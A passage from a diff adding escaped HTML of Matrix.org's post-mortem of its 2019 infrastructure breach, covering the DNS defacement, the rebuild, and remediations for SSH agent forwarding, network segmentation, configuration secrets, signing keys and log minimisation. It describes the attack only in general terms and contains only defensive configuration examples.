small as possible going forwards).&lt;&#x2F;p&gt;
+&lt;p&gt;Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp;amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.&lt;&#x2F;p&gt;
+&lt;p&gt;At about 4am we had enough of the bare necessities back up and running to pause for sleep.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;the-defacement&quot;&gt;The Defacement&lt;&#x2F;h3&gt;
+&lt;p&gt;At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;9435&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;9435&lt;&#x2F;a&gt;). It looks like the attacker didn’t think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn’t yet been fully restored and the normal paging infrastructure wasn’t back up (we now have emergency-emergency-paging for this eventuality).&lt;&#x2F;p&gt;
+&lt;p&gt;On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;cf.png&quot; alt=&quot;Cloudflare login UI&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the &lt;a href=&quot;https:&#x2F;&#x2F;support.cloudflare.com&#x2F;hc&#x2F;en-us&#x2F;articles&#x2F;221318707-How-do-I-change-my-Global-API-Key-&quot;&gt;Change API Key&lt;&#x2F;a&gt; button.&lt;&#x2F;p&gt;
+&lt;p&gt;Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we’d rotated the admin API key, but we hadn’t, thus accidentally enabling the defacement.&lt;&#x2F;p&gt;
+&lt;p&gt;To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;the-rebuild&quot;&gt;The Rebuild&lt;&#x2F;h3&gt;
+&lt;p&gt;The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Access via SSH restricted as heavily as possible&lt;&#x2F;li&gt;
+&lt;li&gt;SSH agent forwarding disabled server-side&lt;&#x2F;li&gt;
+&lt;li&gt;All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Then, whilst reinstating services on the new infra, we opted to review &lt;strong&gt;everything&lt;&#x2F;strong&gt; being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Jenkins has been replaced by &lt;a href=&quot;https:&#x2F;&#x2F;buildkite.com&#x2F;matrix-dot-org&quot;&gt;Buildkite&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Wordpress has been replaced by static generated sites (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;tree&#x2F;master&#x2F;gatsby&quot;&gt;Gatsby&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
+&lt;li&gt;cgit has been replaced by &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&quot;&gt;gitlab&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;Entirely new packaging building, signing &amp;amp; distribution infrastructure (more on that later)&lt;&#x2F;li&gt;
+&lt;li&gt;etc.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it’s important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.&lt;&#x2F;p&gt;
+&lt;p&gt;In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;services.png&quot; alt=&quot;Service status&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Apologies again that it took longer to get some of these services back up than we’d preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a&#x2F;&quot;&gt;other security work&lt;&#x2F;a&gt;, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;remediations&quot;&gt;Remediations&lt;&#x2F;h3&gt;
+&lt;p&gt;Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.&lt;&#x2F;p&gt;
+&lt;p&gt;We’d like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we’re going to have to skip over some of the items, however - after all, remediations imply that there’s something that could be improved, and for obvious reasons we don’t want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.&lt;&#x2F;p&gt;
+&lt;p&gt;We should also acknowledge that after being removed from the infra, the attacker chose to file a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;371&quot;&gt;set of Github issues&lt;&#x2F;a&gt; on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.&lt;&#x2F;p&gt;
+&lt;p&gt;We’ve split the remediation work into the following domains.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;ssh&quot;&gt;SSH&lt;&#x2F;h4&gt;
+&lt;p&gt;Some of the biggest issues exposed by the security breach concerned our use of SSH, which we’ll take in turn:&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;ssh-agent-forwarding-should-be-disabled&quot;&gt;SSH agent forwarding should be disabled.&lt;&#x2F;h5&gt;
+&lt;p&gt;SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‘forward’ access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.&lt;&#x2F;p&gt;
+&lt;p&gt;The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, &lt;a href=&quot;https:&#x2F;&#x2F;developer.github.com&#x2F;v3&#x2F;guides&#x2F;using-ssh-agent-forwarding&#x2F;#setting-up-ssh-agent-forwarding&quot;&gt;Github’s guide to using SSH agent forwarding&lt;&#x2F;a&gt; says: &lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Warning&lt;&#x2F;strong&gt;: You may be tempted to use a wildcard like &lt;code&gt;Host *&lt;&#x2F;code&gt; to just apply this setting (ForwardAgent: yes) to all SSH connections. That&#x27;s not really a good idea, as you&#x27;d be sharing your local SSH keys with &lt;em&gt;every&lt;&#x2F;em&gt; server you SSH into. They won&#x27;t have direct access to the keys, but they will be able to use them &lt;em&gt;as you&lt;&#x2F;em&gt; while the connection is established. &lt;strong&gt;You should only add servers you trust and that you intend to use with agent forwarding&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;As a result, several of the team doing ops work had set &lt;code&gt;Host *.matrix.org ForwardAgent: yes&lt;&#x2F;code&gt; in their ssh client configs, thinking “well, what &lt;em&gt;can&lt;&#x2F;em&gt; we trust if not our own servers?”&lt;&#x2F;p&gt;
+&lt;p&gt;This was a massive, massive mistake.&lt;&#x2F;p&gt;
+&lt;p&gt;If there is one lesson everyone should learn from this whole mess, it is: &lt;strong&gt;SSH agent forwarding is incredibly unsafe, and in general you should never use it.&lt;&#x2F;strong&gt;  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and &lt;em&gt;boom&lt;&#x2F;em&gt;, even if it was just a one-off &lt;code&gt;ssh -A&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Our remediations for this are:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Disable all ssh agent forwarding on the servers.&lt;&#x2F;li&gt;
+&lt;li&gt;If you need to jump through a box to ssh into another box, use &lt;code&gt;ssh -J $host&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;This can also be used with rsync via &lt;code&gt;rsync -e &amp;quot;ssh -J $host&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s &lt;a href=&quot;https:&#x2F;&#x2F;www.openssh.com&#x2F;txt&#x2F;release-8.0&quot;&gt;release notes&lt;&#x2F;a&gt; explicitly recommends using more modern protocols than scp).&lt;&#x2F;li&gt;
+&lt;li&gt;If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.&lt;&#x2F;li&gt;
+&lt;li&gt;If you just need to check out stuff from public git repos, use https rather than git+ssh.&lt;&#x2F;li&gt;
+&lt;li&gt;Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH’s does via &lt;code&gt;ssh-add -c&lt;&#x2F;code&gt;, but gnome-keyring for instance doesn’t), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;ssh-should-not-be-exposed-to-the-general-internet&quot;&gt;SSH should not be exposed to the general internet&lt;&#x2F;h5&gt;
+&lt;p&gt;Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;ssh-keys-should-give-minimal-access&quot;&gt;SSH keys should give minimal access&lt;&#x2F;h5&gt;
+&lt;p&gt;Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.&lt;&#x2F;p&gt;
+&lt;p&gt;A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&quot;&gt;matrix.org blog&lt;&#x2F;a&gt; is continuously deployed into production by Buildkite from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&quot;&gt;GitHub&lt;&#x2F;a&gt; without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We’ve already been experimenting internally with sentry for this.&lt;&#x2F;p&gt;
+&lt;p&gt;Relatedly, we’ve also shifted to requiring multiple SSH keys per user (per device, and for privileged &#x2F; unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn’t help prevent the attack, it did assist with forensics).&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;two-factor-authentication&quot;&gt;Two factor authentication&lt;&#x2F;h5&gt;
+&lt;p&gt;We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys&quot;&gt;It should be made as hard as possible to add malicious SSH keys&lt;&#x2F;h5&gt;
+&lt;p&gt;We’ve decided to stop users from being able to directly manage their own SSH keys in production via &lt;code&gt;~&#x2F;.ssh&#x2F;authorized_keys&lt;&#x2F;code&gt; (or &lt;code&gt;~&#x2F;.ssh&#x2F;authorized_keys2&lt;&#x2F;code&gt; for that matter) - we can see no benefit from letting non-root users set keys.&lt;&#x2F;p&gt;
+&lt;p&gt;Instead, keys for all accounts are managed exclusively by Ansible via &lt;code&gt;&#x2F;etc&#x2F;ssh&#x2F;authorized_keys&#x2F;$account&lt;&#x2F;code&gt; (using sshd’s &lt;code&gt;AuthorizedKeysFile &#x2F;etc&#x2F;ssh&#x2F;authorized_keys&#x2F;%u&lt;&#x2F;code&gt; directive).&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;changes-to-ssh-keys-should-be-carefully-monitored&quot;&gt;Changes to SSH keys should be carefully monitored&lt;&#x2F;h5&gt;
+&lt;p&gt;If we’d had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.&lt;&#x2F;p&gt;
+&lt;p&gt;Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;ssh-config-should-be-hardened-disabling-unnecessary-options&quot;&gt;SSH config should be hardened, disabling unnecessary options&lt;&#x2F;h5&gt;
+&lt;p&gt;If we’d gone through reviewing the default sshd config when we set up the datacenter in the first place, we’d have caught several of these failure modes at the outset.  We’ve now done so (as per above).&lt;&#x2F;p&gt;
+&lt;p&gt;We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines. &lt;&#x2F;p&gt;
+&lt;h4 id=&quot;network-architecture&quot;&gt;Network architecture&lt;&#x2F;h4&gt;
+&lt;p&gt;As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.&lt;&#x2F;p&gt;
+&lt;p&gt;We are addressing this by:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
+&lt;ul&gt;
+&lt;li&gt;Development&lt;&#x2F;li&gt;
+&lt;li&gt;Intranet&lt;&#x2F;li&gt;
+&lt;li&gt;Package Build (airgapped; see below for more details)&lt;&#x2F;li&gt;
+&lt;li&gt;Package Distribution&lt;&#x2F;li&gt;
+&lt;li&gt;Production, which is in turn split per class of service.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.&lt;&#x2F;li&gt;
+&lt;li&gt;Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. &lt;&#x2F;p&gt;
+&lt;h4 id=&quot;keeping-patched&quot;&gt;Keeping patched&lt;&#x2F;h4&gt;
+&lt;p&gt;Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).&lt;&#x2F;p&gt;
+&lt;p&gt;Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.&lt;&#x2F;p&gt;
+&lt;p&gt;Aside from our infrastructure, we’re also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.&lt;&#x2F;p&gt;
+&lt;p&gt;Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;intrusion-detection&quot;&gt;Intrusion detection&lt;&#x2F;h4&gt;
+&lt;p&gt;There’s obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we’re working on real-time log analysis for aberrant behaviour.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;incident-management&quot;&gt;Incident management&lt;&#x2F;h4&gt;
+&lt;p&gt;There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)&lt;&#x2F;li&gt;
+&lt;li&gt;The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.&lt;&#x2F;li&gt;
+&lt;li&gt;The need to have an existing inventory of services and secrets available for tracking progress and prioritisation&lt;&#x2F;li&gt;
+&lt;li&gt;The need to have a general incident management &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=19682451&amp;amp;p=2&quot;&gt;checklist&lt;&#x2F;a&gt; for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
+&lt;ul&gt;
+&lt;li&gt;Remembering to appoint named incident manager, external comms manager &amp;amp; internal comms manager. (They could of course be the same person, but the roles are distinct).&lt;&#x2F;li&gt;
+&lt;li&gt;Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff&lt;&#x2F;li&gt;
+&lt;li&gt;Remembering to informing the ICO (Information Commissioner Office) of any user data breaches&lt;&#x2F;li&gt;
+&lt;li&gt;Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)&lt;&#x2F;li&gt;
+&lt;li&gt;Reminders to snapshot systems for forensics &amp;amp; backups&lt;&#x2F;li&gt;
+&lt;li&gt;Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.&lt;&#x2F;li&gt;
+&lt;li&gt;Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;configuration-management&quot;&gt;Configuration management&lt;&#x2F;h4&gt;
+&lt;p&gt;One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.&lt;&#x2F;p&gt;
+&lt;p&gt;This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.&lt;&#x2F;p&gt;
+&lt;p&gt;Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It’s unfortunate that we had already done the work for this (and even had been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ansible-community&#x2F;ansible-london-meetup&#x2F;blob&#x2F;master&#x2F;presentations&#x2F;2019-01-31&#x2F;Introducing%20Ansible%20to%20matrix-final.pdf&quot;&gt;giving talks at Ansible meetups&lt;&#x2F;a&gt; about it!) but had not yet applied it to the legacy infrastructure.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;avoiding-temporary-measures-which-last-forever&quot;&gt;Avoiding temporary measures which last forever&lt;&#x2F;h4&gt;
+&lt;p&gt;None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;secure-packaging&quot;&gt;Secure packaging&lt;&#x2F;h4&gt;
+&lt;p&gt;One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot&#x2F;Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.&lt;&#x2F;p&gt;
+&lt;p&gt;Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot&#x2F;Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot&#x2F;Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot&#x2F;Android and &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-im-android-security-update-2b3f655ad739&quot;&gt;started over&lt;&#x2F;a&gt;.  (If you want to give the newly released app a fighting chance despite this setback, feel free to &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=im.vector.app&amp;amp;showAllReviews=true&quot;&gt;give it some stars&lt;&#x2F;a&gt; on the Play Store). We also revoked the compromised Synapse &amp;amp; Riot GPG keys and created new ones (and published &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1&quot;&gt;new instructions&lt;&#x2F;a&gt; for how to securely set up your Synapse or Riot debian repos).&lt;&#x2F;p&gt;
+&lt;p&gt;In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).&lt;&#x2F;li&gt;
+&lt;li&gt;We then perform all releases from a dedicated isolated release terminal.
+&lt;ul&gt;
+&lt;li&gt;This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.&lt;&#x2F;li&gt;
+&lt;li&gt;Needless to say, the device is strictly used for &lt;em&gt;nothing&lt;&#x2F;em&gt; other than performing releases.&lt;&#x2F;li&gt;
+&lt;li&gt;The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)&lt;&#x2F;li&gt;
+&lt;li&gt;The signing keys (hardware or software) are kept exclusively on this device.&lt;&#x2F;li&gt;
+&lt;li&gt;The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.&lt;&#x2F;li&gt;
+&lt;li&gt;We physically store the device securely.&lt;&#x2F;li&gt;
+&lt;li&gt;We ensure someone on the team always has physical access to it in order to do emergency builds.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
+&lt;ul&gt;
+&lt;li&gt;These live at &lt;a href=&quot;https:&#x2F;&#x2F;packages.matrix.org&quot;&gt;https:&#x2F;&#x2F;packages.matrix.org&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;packages.riot.im&quot;&gt;https:&#x2F;&#x2F;packages.riot.im&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;These are minimal machines with nothing but a static web-server.&lt;&#x2F;li&gt;
+&lt;li&gt;They are accessed only via the dedicated SSH keys stored on the release terminal.&lt;&#x2F;li&gt;
+&lt;li&gt;These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s &lt;a href=&quot;https:&#x2F;&#x2F;www.cloudflare.com&#x2F;always-online&#x2F;&quot;&gt;always online&lt;&#x2F;a&gt; feature, for better or worse).&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Alternatives here included:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.&lt;&#x2F;li&gt;
+&lt;li&gt;We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;370&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;370&lt;&#x2F;a&gt;).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;dev-and-ci-infrastructure&quot;&gt;Dev and CI infrastructure&lt;&#x2F;h4&gt;
+&lt;p&gt;The main change in our dev and CI infrastructure is to move from Jenkins to &lt;a href=&quot;https:&#x2F;&#x2F;buildkite.com&#x2F;matrix-dot-org&quot;&gt;Buildkite&lt;&#x2F;a&gt;.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.&lt;&#x2F;p&gt;
+&lt;p&gt;The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. &lt;a href=&quot;riot.im&#x2F;develop&quot;&gt;riot.im&#x2F;develop&lt;&#x2F;a&gt;), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.&lt;&#x2F;p&gt;
+&lt;p&gt;Other than CI, our strategy is:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Continue using Github for public repositories&lt;&#x2F;li&gt;
+&lt;li&gt;Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;Olm&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
+&lt;li&gt;Continue to host docker images on Docker Hub (despite their recent &lt;a href=&quot;https:&#x2F;&#x2F;success.docker.com&#x2F;article&#x2F;docker-hub-user-notification&quot;&gt;security dramas&lt;&#x2F;a&gt;).&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;log-minimisation-and-handling-personally-identifying-information-pii&quot;&gt;Log minimisation and handling Personally Identifying Information (PII)&lt;&#x2F;h4&gt;
+&lt;p&gt;Another thing that the breach made painfully clear is that we log too much.  While there’s not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we’ve kept logging on matrix.org relatively verbose to help with debugging.  There’s nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn’t pick it up.&lt;&#x2F;p&gt;
+&lt;p&gt;However, we can still improve our logging and PII-handling substantially:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).&lt;&#x2F;li&gt;
+&lt;li&gt;Minimising log retention to the bare minimum we need to investigate recent issues and abuse&lt;&#x2F;li&gt;
+&lt;li&gt;Ensuring that PII is stored hashed wherever possible.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;policies&#x2F;tree&#x2F;master&#x2F;docs&#x2F;matrix-org&quot;&gt;privacy policies&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;05&#x2F;08&#x2F;gdpr-compliance-in-matrix&#x2F;&quot;&gt;GDPR work&lt;&#x2F;a&gt;), but there is also more we can do, particularly:&lt;&#x2F;p&gt;
+&lt;ul&gt;
